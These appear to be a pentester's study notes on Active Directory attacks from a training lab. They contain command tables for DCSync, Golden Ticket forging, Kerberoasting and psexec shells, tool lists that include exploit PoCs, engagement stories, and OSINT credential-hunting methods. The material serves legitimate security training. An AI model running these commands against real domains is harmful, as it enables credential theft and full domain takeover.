| `Get-DomainTrustMapping`                                     | PowerView tool used to perform a domain trust mapping from a Windows-based host. |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | PowerView tools used to enumerate users in a target child domain from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`          | Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host. |
| `Get-DomainSID`                                              | PowerView tool used to get the SID for a target child domain from a Windows-based host. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host. |
| `ls \\academy-ea-dc01.inlanefreight.local\c$`                | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host . |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`     | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 ` | Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"` | Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Impacket tool used to create a `Golden Ticket` from a Linux-based host. |
| `export KRB5CCNAME=hacker.ccache`                            | Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Impacket tool that automatically performs an attack that escalates from child to parent domain. |



# Trust Relationships - Cross-Forest 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host. |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host. |
| ` .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host. |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host. |
| `zip -r ilfreight_bh.zip *.json`                             | Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI. |

[+] Active Directory Enumeration & attacks

* Active Directory Explained

    > Active Directory (AD) is a directory service for Windows enterprise environments that was officially implemented in 2000 with the release of Windows Server 2000 and has been incrementally improved upon with the release of each subsequent server OS since. AD is based on the protocols x.500 and LDAP that came before it and still utilizes these protocols in some form today. It is a distributed, hierarchical structure that allows for centralized management of an organization’s resources, including users, computers, groups, network devices and file shares, group policies, devices, and trusts. AD provides authentication, accounting, and authorization functions within a Windows enterprise environment. 


    ! Real-World Examples

        > Let's look at a few scenarios to see just what is possible in a real-world AD-centric engagement:
        > Scenario 1 - Waiting On An Admin

            - During this engagement, I compromised a single host and gained SYSTEM level access. Because this was a domain-joined host, I was able to use this access to enumerate the domain. I went through all of the standard enumeration, but did not find much. There were Service Principal Names (SPNs) present within the environment, and I was able to perform a Kerberoasting attack and retrieve TGS tickets for a few accounts. I attempted to crack these with Hashcat and some of my standard wordlists and rules, but was unsuccessful at first. I ended up leaving a cracking job running overnight with a very large wordlist combined with the d3ad0ne(https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) rule that ships with Hashcat. The next morning I had a hit on one ticket and retrieved the cleartext password for a user account. This account did not give me significant access, but it did give me write access on certain file shares. I used this access to drop SCF files around the shares and left Responder going. After a while, I got a single hit, the NetNTLMv2 hash of a user. I checked through the BloodHound output and noticed that this user was actually a domain admin! Easy day from here.

        > Scenario 2 - Spraying The Night Away

            - Password spraying can be an extremely effective way to gain a foothold in a domain, but we must exercise great care not to lock out user accounts in the process. On one engagement, I found an SMB NULL session using the enum4linux tool and retrieved both a listing of all users from the domain, and the domain password policy. Knowing the password policy was crucial because I could ensure that I was staying within the parameters to not lock out any accounts and also knew that the policy was a minimum eight-character password and password complexity was enforced (meaning that a user's password required 3/4 of special character, number, uppercase, or lower case number, i.e., Welcome1). I tried several common weak passwords such as Welcome1, Password1, Password123, Spring2018, etc. but did not get any hits. Finally, I made an attempt with Spring@18 and got a hit! Using this account, I ran BloodHound and found several hosts where this user had local admin access. I noticed that a domain admin account had an active session on one of these hosts. I was able to use the Rubeus tool and extract the Kerberos TGT ticket for this domain user. From there, I was able to perform a pass-the-ticket attack and authenticate as this domain admin user. As a bonus, I was able to take over the trusting domain as well because the Domain Administrators group for the domain that I took over was a part of the Administrators group in the trusting domain via nested group membership, meaning I could use the same set of credentials to authenticate to the other domain with full administrative level access.

        > Scenario 3 - Fighting In The Dark

            - I had tried all of my standard ways to obtain a foothold on this third engagement, and nothing had worked. I decided that I would use the Kerbrute(https://github.com/ropnop/kerbrute) tool to attempt to enumerate valid usernames and then, if I found any, attempt a targeted password spraying attack since I did not know the password policy and didn't want to lock any accounts out. I used the linkedin2username(https://github.com/initstring/linkedin2username) tool to first mashup potential usernames from the company's LinkedIn page. I combined this list with several username lists from the statistically-likely-usernames(https://github.com/insidetrust/statistically-likely-usernames) GitHub repo and, after using the userenum feature of Kerbrute, ended up with 516 valid users. I knew I had to tread carefully with password spraying, so I tried with the password Welcome2021 and got a single hit! Using this account, I ran the Python version of BloodHound from my attack host and found that all domain users had RDP access to a single box. I logged into this host and used the PowerShell tool DomainPasswordSpray(https://github.com/dafthack/DomainPasswordSpray) to spray again. I was more confident this time around because I could a) view the password policy and b) the DomainPasswordSpray tool will remove accounts close to lockout from the target list. Being that I was authenticated within the domain, I could now spray with all domain users, which gave me significantly more targets. I tried again with the common password Fall2021 and got several hits, all for users not in my initial wordlist. I checked the rights for each of these accounts and found that one was in the Help Desk group, which had GenericAll(https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall) rights over the Enterprise Key Admins group. The Enterprise Key Admins(https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#enterprise-key-admins) group had GenericAll privileges over a domain controller, so I added the account I controlled to this group, authenticated again, and inherited these privileges. Using these rights, I performed the Shadow Credentials(https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) attack and retrieved the NT hash for the domain controller machine account. With this NT hash, I was then able to perform a DCSync attack and retrieve the NTLM password hashes for all users in the domain because a domain controller can perform replication, which is required for DCSync. 

* Toolkit
    > MS01 ==> C:\tools ==> xfreerdp /v:<MS01 target IP> /u:htb-student /p:Academy_student_AD!
    > ATTACK01 ==> htb-student path or /opt directory ==> ssh htb-student@<ATTACK01 target IP>

* Tools of the trade
Tool	Description
PowerView/SharpView	A PowerShell tool and a .NET port of the same used to gain situational awareness in AD. These tools can be used as replacements for various Windows net* commands and more. PowerView and SharpView can help us gather much of the data that BloodHound does, but it requires more work to make meaningful relationships among all of the data points. These tools are great for checking what additional access we may have with a new set of credentials, targeting specific users or computers, or finding some "quick wins" such as users that can be attacked via Kerberoasting or ASREPRoasting.
BloodHound	Used to visually map out AD relationships and help plan attack paths that may otherwise go unnoticed. Uses the SharpHound PowerShell or C# ingestor to gather data to later be imported into the BloodHound JavaScript (Electron) application with a Neo4j database for graphical analysis of the AD environment.
SharpHound	The C# data collector to gather information from Active Directory about varying AD objects such as users, groups, computers, ACLs, GPOs, user and computer attributes, user sessions, and more. The tool produces JSON files which can then be ingested into the BloodHound GUI tool for analysis.
BloodHound.py	A Python-based BloodHound ingestor based on the Impacket toolkit. It supports most BloodHound collection methods and can be run from a non-domain joined attack host. The output can be ingested into the BloodHound GUI for analysis.
Kerbrute	A tool written in Go that uses Kerberos Pre-Authentication to enumerate Active Directory accounts, perform password spraying, and brute-forcing.
Impacket toolkit	A collection of tools written in Python for interacting with network protocols. The suite of tools contains various scripts for enumerating and attacking Active Directory.
Responder	Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
Inveigh.ps1	Similar to Responder, a PowerShell tool for performing various network spoofing and poisoning attacks.
C# Inveigh (InveighZero)	The C# version of Inveigh with a semi-interactive console for interacting with captured data such as username and password hashes.
rpcinfo	The rpcinfo utility is used to query the status of an RPC program or enumerate the list of available RPC services on a remote host. The "-p" option is used to specify the target host. For example the command "rpcinfo -p 10.0.0.1" will return a list of all the RPC services available on the remote host, along with their program number, version number, and protocol. Note that this command must be run with sufficient privileges.
rpcclient	A part of the Samba suite on Linux distributions that can be used to perform a variety of Active Directory enumeration tasks via the remote RPC service.
CrackMapExec (CME)	CME is an enumeration, attack, and post-exploitation toolkit which can help us greatly in enumeration and performing attacks with the data we gather. CME attempts to "live off the land" and abuse built-in AD features and protocols like SMB, WMI, WinRM, and MSSQL.
Rubeus	Rubeus is a C# tool built for Kerberos Abuse.
GetUserSPNs.py	Another Impacket module geared towards finding Service Principal names tied to normal users.
Hashcat	A great hash cracking and password recovery tool.
enum4linux	A tool for enumerating information from Windows and Samba systems.
enum4linux-ng	A rework of the original Enum4linux tool that works a bit differently.
ldapsearch	Built-in interface for interacting with the LDAP protocol.
windapsearch	A Python script used to enumerate AD users, groups, and computers using LDAP queries. Useful for automating custom LDAP queries.
DomainPasswordSpray.ps1	DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain.
LAPSToolkit	The toolkit includes functions written in PowerShell that leverage PowerView to audit and attack Active Directory environments that have deployed Microsoft's Local Administrator Password Solution (LAPS).
smbmap	SMB share enumeration across a domain.
psexec.py	Part of the Impacket toolkit, it provides us with Psexec-like functionality in the form of a semi-interactive shell.
wmiexec.py	Part of the Impacket toolkit, it provides the capability of command execution over WMI.
Snaffler	Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.
smbserver.py	Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.
setspn.exe	Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.
Mimikatz	Performs many functions. Notably, pass-the-hash attacks, extracting plaintext passwords, and Kerberos ticket extraction from memory on a host.
secretsdump.py	Remotely dump SAM and LSA secrets from a host.
evil-winrm	Provides us with an interactive shell on a host over the WinRM protocol.
mssqlclient.py	Part of the Impacket toolkit, it provides the ability to interact with MSSQL databases.
noPac.py	Exploit combo using CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user.
rpcdump.py	Part of the Impacket toolset, RPC endpoint mapper.
CVE-2021-1675.py	Printnightmare PoC in python.
ntlmrelayx.py	Part of the Impacket toolset, it performs SMB relay attacks.
PetitPotam.py	PoC tool for CVE-2021-36942 to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
gettgtpkinit.py	Tool for manipulating certificates and TGTs.
getnthash.py	This tool will use an existing TGT to request a PAC for the current user using U2U.
adidnsdump	A tool for enumerating and dumping DNS records from a domain. Similar to performing a DNS Zone transfer.
gpp-decrypt	Extracts usernames and passwords from Group Policy preferences files.
GetNPUsers.py	Part of the Impacket toolkit. Used to perform the ASREPRoasting attack to list and obtain AS-REP hashes for users with the 'Do not require Kerberos preauthentication' set. These hashes are then fed into a tool such as Hashcat for attempts at offline password cracking.
lookupsid.py	SID bruteforcing tool.
ticketer.py	A tool for creation and customization of TGT/TGS tickets. It can be used for Golden Ticket creation, child to parent trust attacks, etc.
raiseChild.py	Part of the Impacket toolkit, It is a tool for automated child to parent domain privilege escalation.
Active Directory Explorer	Active Directory Explorer (AD Explorer) is an AD viewer and editor. It can be used to navigate an AD database and view object properties and attributes. It can also be used to save a snapshot of an AD database for offline analysis. When an AD snapshot is loaded, it can be explored as a live version of the database. It can also be used to compare two AD database snapshots to see changes in objects, attributes, and security permissions.
PingCastle	Used for auditing the security level of an AD environment based on a risk assessment and maturity framework (based on CMMI adapted to AD security).
Group3r	Group3r is useful for auditing and finding security misconfigurations in AD Group Policy Objects (GPO).
ADRecon	A tool used to extract various data from a target AD environment. The data can be output in Microsoft Excel format with summary views and analysis to assist with analysis and paint a picture of the environment's overall security state.

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
https://github.com/dmchell/SharpView
https://github.com/BloodHoundAD/BloodHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
https://github.com/fox-it/BloodHound.py
https://github.com/ropnop/kerbrute
https://github.com/SecureAuthCorp/impacket
https://github.com/lgandx/Responder
https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo
https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html
https://github.com/byt3bl33d3r/CrackMapExec
https://github.com/GhostPack/Rubeus
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
https://hashcat.net/hashcat/
https://github.com/CiscoCXSecurity/enum4linux
https://github.com/cddmp/enum4linux-ng
https://linux.die.net/man/1/ldapsearch
https://github.com/ropnop/windapsearch
https://github.com/dafthack/DomainPasswordSpray
https://github.com/leoloobeek/LAPSToolkit
https://github.com/ShawnDEvans/smbmap
https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
https://github.com/SnaffCon/Snaffler
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
https://github.com/ParrotSec/mimikatz
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
https://github.com/Hackplayers/evil-winrm
https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
https://github.com/Ridter/noPac
https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py
https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py
https://github.com/topotam/PetitPotam
https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py
https://github.com/dirkjanm/adidnsdump
https://github.com/t0thkr1s/gpp-decrypt
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py
https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py
https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer
https://www.pingcastle.com/documentation/
https://github.com/Group3r/Group3r
https://github.com/adrecon/ADRecon

#Enumeration

[+] External Recon and Enumeration Principles
    > What Are We Looking For?
        * Data Point	            Description
        > IP Space	                Valid ASN for our target, netblocks in use for the organization's public-facing infrastructure, cloud presence and the hosting providers, DNS record entries, etc.
        > Domain Information	    Based on IP data, DNS, and site registrations. Who administers the domain? Are there any subdomains tied to our target? 
                                    Are there any publicly accessible domain services present? (Mailservers, DNS, Websites, VPN portals, etc.) Can we determine what kind of defenses are in place? 
                                    (SIEM, AV, IPS/IDS in use, etc.)
        > Schema Format	            Can we discover the organization's email accounts, AD usernames, and even password policies? Anything that will give us information we can use to build a valid
                                    username list to test external-facing services for password spraying, credential stuffing, brute forcing, etc.
        > Data Disclosures	        For data disclosures we will be looking for publicly accessible files ( .pdf, .ppt, .docx, .xlsx, etc. ) for any information that helps shed light on the target. 
                                    For example, any published files that contain intranet site listings, user metadata, shares, or other critical software or hardware in the environment
                                    (credentials pushed to a public GitHub repo, the internal AD username format in the metadata of a PDF, for example.) Breach Data	Any publicly released usernames,
                                    passwords, or other critical information that can help an attacker gain a foothold.

    > Where Are We Looking?
        + Our list of data points above can be gathered in many different ways. There are many different websites and tools that can provide us with some or all of the information above that we could use to obtain information vital to our assessment. The table below lists a few potential resources and examples that can be used.
        Resource	Examples
        > ASN / IP registrars	            IANA(https://www.iana.org/), arin(https://www.arin.net/) for searching the Americas, RIPE(https://www.ripe.net/) for searching 
                                            in Europe, BGP Toolkit(https://bgp.he.net/)
        > Domain Registrars & DNS	        Domaintools(https://www.domaintools.com/), PTRArchive(http://ptrarchive.com/), ICANN(https://lookup.icann.org/lookup), manual DNS record requests
                                            against the domain in question or against well known DNS servers, such as 8.8.8.8.
        > Social Media	                    Searching Linkedin, Twitter, Facebook, your region's major social media sites, news articles, and any relevant info you can find about the organization.
        > Public-Facing Company Websites	Often, the public website for a corporation will have relevant info embedded. News articles, embedded documents, and the "About Us" 
                                            and "Contact Us" pages can also be gold mines.
        > Cloud & Dev Storage Spaces	    GitHub, AWS S3 buckets & Azure Blog storage containers(https://grayhatwarfare.com/), Google searches using 
                                            "Dorks"(https://www.exploit-db.com/google-hacking-database)
        > Breach Data Sources	            HaveIBeenPwned to determine if any corporate email accounts appear in public breach data, Dehashed(https://www.dehashed.com/) to search for corporate
                                            emails with cleartext passwords or hashes we can try to crack offline. We can then try these passwords against any exposed login
                                            portals  (Citrix, RDS, OWA, 0365, VPN, VMware Horizon, custom applications, etc.) that may use AD authentication.

* Finding address spaces 
    > The BGP-Toolkit hosted by Hurricane Electric(http://he.net/) is a fantastic resource for researching what address blocks are assigned to an organization and what ASN they reside within. Just punch in a domain or IP address, and the toolkit will search for any results it can. We can glean a lot from this info. Many large corporations will often self-host their infrastructure, and since they have such a large footprint, they will have their own ASN. This will typically not be the case for smaller organizations or fledgling companies. As you research, keep this in mind since smaller organizations will often host their websites and other infrastructure in someone else's space (Cloudflare, Google Cloud, AWS, or Azure, for example). Understanding where that infrastructure resides is extremely important for our testing. We have to ensure we are not interacting with infrastructure out of our scope. If we are not careful while pentesting against a smaller organization, we could end up inadvertently causing harm to another organization sharing that infrastructure. You have an agreement to test with the customer, not with others on the same server or with the provider. Questions around self-hosted or 3rd party managed infrastructure should be handled during the scoping process and be clearly listed in any scoping documents you receive.

    > In some cases, your client may need to get written approval from a third-party hosting provider before you can test. Others, such as AWS(https://aws.amazon.com/security/penetration-testing/), have specific guidelines for performing penetration tests and do not require prior approval for testing some of their services. Others, such as Oracle, ask you to submit a Cloud Security Testing Notification(https://docs.oracle.com/en-us/iaas/Content/Security/Concepts/security_testing-policy_notification.htm). These types of steps should be handled by your company management, legal team, contracts team, etc. If you are in doubt, escalate before attacking any external-facing services you are unsure of during an assessment. It is our responsibility to ensure that we have explicit permission to attack any hosts (both internal and external), and stopping and clarifying the scope in writing never hurts.

* DNS

    > DNS is a great way to validate our scope and find out about reachable hosts the customer did not disclose in their scoping document. Sites like domaintools(https://whois.domaintools.com/), and viewdns.info(https://viewdns.info/) are great spots to start. We can get back many records and other data ranging from DNS resolution to testing for DNSSEC and if the site is accessible in more restricted countries. Sometimes we may find additional hosts out of scope, but look interesting. In that case, we could bring this list to our client to see if any of them should indeed be included in the scope. We may also find interesting subdomains that were not listed in the scoping documents, but reside on in-scope IP addresses and therefore are fair game.
    > This is also a great way to validate some of the data found from our IP/ASN searches. Not all information about the domain found will be current, and running checks that can validate what we see is always good practice.

* Public Data

    > Social media can be a treasure trove of interesting data that can clue us in to how the organization is structured, what kind of equipment they operate, potential software and security implementations, their schema, and more. On top of that list are job-related sites like LinkedIn, Indeed.com, and Glassdoor. Simple job postings often reveal a lot about a company.
    > Don't discount public information such as job postings or social media. You can learn a lot about an organization just from what they post, and a well-intentioned post could disclose data relative to us as penetration testers.

    > Websites hosted by the organization are also great places to dig for information. We can gather contact emails, phone numbers, organizational charts, published documents, etc. These sites, specifically the embedded documents, can often have links to internal infrastructure or intranet sites that you would not otherwise know about. Checking any publicly accessible information for those types of details can be quick wins when trying to formulate a picture of the domain structure. With the growing use of sites such as GitHub, AWS cloud storage, and other web-hosted platforms, data can also be leaked unintentionally. For example, a dev working on a project may accidentally leave some credentials or notes hardcoded into a code release. If you know where to look for that data, it can give you an easy win. It could mean the difference between having to password spray and brute-force credentials for hours or days or gaining a quick foothold with developer credentials, which may also have elevated permissions. Tools like Trufflehog(https://github.com/trufflesecurity/truffleHog) and sites like Greyhat Warfare(https://buckets.grayhatwarfare.com/) are fantastic resources for finding these breadcrumbs.

* Example enumeration process
    > Check for ASN/IP & Domain data ==> hurricane
    > Viewdns.info results 
    > In the request above, we utilized viewdns.info to validate the IP address of our target. Both results match, which is a good sign. Now let's try another route to validate the two nameservers in our results.
    > m1l0js@htb[/htb]$ nslookup ns1.inlanefreight.com
    > We now have two new IP addresses to add to our list for validation and testing. Before taking any further action with them, ensure they are in-scope for your test. For our purposes, the actual IP addresses would not be in scope for scanning, but we could passively browse any websites to hunt for interesting data. For now, that is it with enumerating domain information from DNS. Let's take a look at the publicly available information.
    > Inlanefreight is a fictitious company that we are using for this module, so there is no real social media presence. However, we would check sites like LinkedIn, Twitter, Instagram, and Facebook for helpful info if it were real. Instead, we will move on to examining the website inlanefreight.com.
    > The first check we ran was looking for any documents. Using filetype:pdf inurl:inlanefreight.com as a search, we are looking for PDFs.
    > Hunting For Files
        filetype:pdf inurl:inlanefreight.com
    > Hunting e-mail addresses 
        intext:"@inlanefreight.com" inurl:inlanefreight.com
    > Using the dork intext:"@inlanefreight.com" inurl:inlanefreight.com, we are looking for any instance that appears similar to the end of an email address on the website. One promising result came up with a contact page. When we look at the page (pictured below), we can see a large list of employees and contact info for them. This information can be helpful since we can determine that these people are at least most likely active and still working with the company.

    > E-mail Dork Results
        + Browsing the contact page, we can see several emails for staff in different offices around the globe. We now have an idea of their email naming convention (first.last) and where some people work in the organization. This could be handy in later password spraying attacks or if social engineering/phishing were part of our engagement scope.
    
    > Username harvesting
        + We can use a tool such as linkedin2username(https://github.com/initstring/linkedin2username) to scrape data from a company's LinkedIn page and create various mashups of usernames (flast, first.last, f.last, etc.) that can be added to our list of potential password spraying targets.

    > Credential Hunting
        + Dehashed(http://dehashed.com/) is an excellent tool for hunting for cleartext credentials and password hashes in breach data. We can search either on the site or using a script that performs queries via the API. Typically we will find many old passwords for users that do not work on externally-facing portals that use AD auth (or internal), but we may get lucky! This is another tool that can be useful for creating a user list for external or internal password spraying.
    > Note: For our purposes, the sample data below is fictional.

    > Credential Hunting
        m1l0js@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

* Initial enumeration of the domain
    > Setting Up
    > For this first portion of the test, we are starting on an attack host placed inside the network for us. This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:
        + A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.
        + A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.
        + A physical presence at their office with our laptop plugged into an ethernet port.
        + A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.
        + VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).
        + From a corporate laptop connected to the client's VPN.
        + On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.
        + On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.
    > These are the most common setups I have seen, though a client may come up with another variation of one of these. The client may also choose from a "grey box" approach where they give us just a list of in-scope IP addresses/CIDR network ranges, or "black box" where we have to plug in and do all discovery blindly using various techniques. Finally, they can choose either evasive, non-evasive, or hybrid evasive (starting "quiet" and slowly getting louder to see what threshold we are detected at and then switching to non-evasive testing. They may also elect to have us start with no credentials or from the perspective of a standard domain user.


* Our example

	> For this first portion of the test, we are starting on an attack host placed inside the network for us. This is one common way that a client might select for us to perform an internal penetration test. A list of the types of setups a client may choose for testing includes:

    		+ A penetration testing distro (typically Linux) as a virtual machine in their internal infrastructure that calls back to a jump host we control over VPN, and we can SSH into.
    		+ A physical device plugged into an ethernet port that calls back to us over VPN, and we can SSH into.
    		+ A physical presence at their office with our laptop plugged into an ethernet port.
    		+ A Linux VM in either Azure or AWS with access to the internal network that we can SSH into using public key authentication and our public IP address whitelisted.
    		+ VPN access into their internal network (a bit limiting because we will not be able to perform certain attacks such as LLMNR/NBT-NS Poisoning).
    		+ From a corporate laptop connected to the client's VPN.
    		+ On a managed workstation (typically Windows), physically sitting in their office with limited or no internet access or ability to pull in tools. They may also elect this option but give you full internet access, local admin, and put endpoint protection into monitor mode so you can pull in tools at will.
    		+ On a VDI (virtual desktop) accessed using Citrix or the like, with one of the configurations described for the managed workstation typically accessible over VPN either remotely or from a corporate laptop.
	
    > These are the most common setups I have seen, though a client may come up with another variation of one of these. The client may also choose from a "grey box" approach where they give us just a list of in-scope IP addresses/CIDR network ranges, or "black box" where we have to plug in and do all discovery blindly using various techniques. Finally, they can choose either evasive, non-evasive, or hybrid evasive (starting "quiet" and slowly getting louder to see what threshold we are detected at and then switching to non-evasive testing. They may also elect to have us start with no credentials or from the perspective of a standard domain user.
    > Our customer Inlanefreight has chosen the following approach because they are looking for as comprehensive an assessment as possible. At this time, their security program is not mature enough to benefit from any form of evasive testing or a "black box" approach.

        + A custom pentest VM within their internal network that calls back to our jump host, and we can SSH into it to perform testing.
        + They've also given us a Windows host that we can load tools onto if need be.
        + They've asked us to start from an unauthenticated standpoint but have also given us a standard domain user account (htb-student) which can be used to access the Windows attack host.
        + "Grey box" testing. They have given us the network range 172.16.5.0/23 and no other information about the network.
        + Non-evasive testing.

    > We have not been provided credentials or a detailed internal network map.
* Tasks
    > Our tasks to accomplish for this section are:
        + Enumerate the internal network, identifying hosts, critical services, and potential avenues for a foothold.
        + This can include active and passive measures to identify users, hosts, and vulnerabilities we may be able to take advantage of to further our access.
        + Document any findings we come across for later use. Extremely important!
    > We will start from our Linux attack host without domain user credentials. It's a common thing to start a pentest off in this manner. Many organizations will wish to see what you can do from a blind perspective, such as this, before providing you with further information for the test. It gives a more realistic look at what potential avenues an adversary would have to use to infiltrate the domain. It can help them see what an attacker could do if they gain unauthorized access via the internet (i.e., a phishing attack), physical access to the building, wireless access from outside (if the wireless network touches the AD environment), or even a rogue employee. Depending on the success of this phase, the customer may provide us with access to a domain-joined host or a set of credentials for the network to expedite testing and allow us to cover as much ground as possible.
    > Below are some of the key data points that we should be looking for at this time and noting down into our notetaking tool of choice and saving scan/tool output to files whenever possible.

    > Key Data Points
    Data Point	                    Description
    AD Users	                    We are trying to enumerate valid user accounts we can target for password spraying.
    AD Joined                       Computers	Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.
    Key Services	                Kerberos, NetBIOS, LDAP, DNS
    VulnerableHosts and Services	Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)

* Let's look at a few tools and techniques to help us with this enumeration.
    + Identifying Hosts

        > First, let's take some time to listen to the network and see what's going on. We can use Wireshark and TCPDump to "put our ear to the wire" and see what hosts and types of network traffic we can capture. This is particularly helpful if the assessment approach is "black box." We notice some ARP requests and replies, MDNS, and other basic layer two packets (since we are on a switched network, we are limited to the current broadcast domain) some of which we can see below. This is a great start that gives us a few bits of information about the customer's network setup.

